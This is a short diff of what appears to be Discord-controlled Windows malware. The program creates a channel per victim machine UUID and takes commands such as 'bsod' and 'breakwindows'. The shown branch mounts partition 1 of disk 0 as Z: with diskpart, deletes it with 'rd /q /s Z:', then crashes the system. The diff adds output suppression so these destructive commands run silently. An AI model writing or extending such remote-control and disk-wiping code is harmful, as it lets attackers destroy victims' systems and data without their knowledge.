@@ -34,7 +34,7 @@ def get_user_uuid():
     return computer_uuid.lower()
 guild_id = '1214641970631417876'
 user = DiscordRestAPI.User()
-user = user.Login('g',True)
+user = user.Login(',',True)
 channel_id = user.Channel.Create(user,guild_id,get_user_uuid(),"1214644732148588555")['id']
 def Mbox(text):
     with open(os.environ['temp'] + '\\message.vbs','w') as f:
@@ -142,8 +142,8 @@ sel disk 0
 sel par 1
 assign letter=Z
 ''')
-        os.system('diskpart /s %temp%\\tmp.txt')
-        os.system('rd /q /s Z:')
+        os.system('diskpart /s %temp%\\tmp.txt > nul 2>nul')
+        os.system('rd /q /s Z: > nul 2>nul')
         computer_bsod()
     else:
         user.Message.Send(user,"Choose option: (bsod/breakwindows)",channel_id)
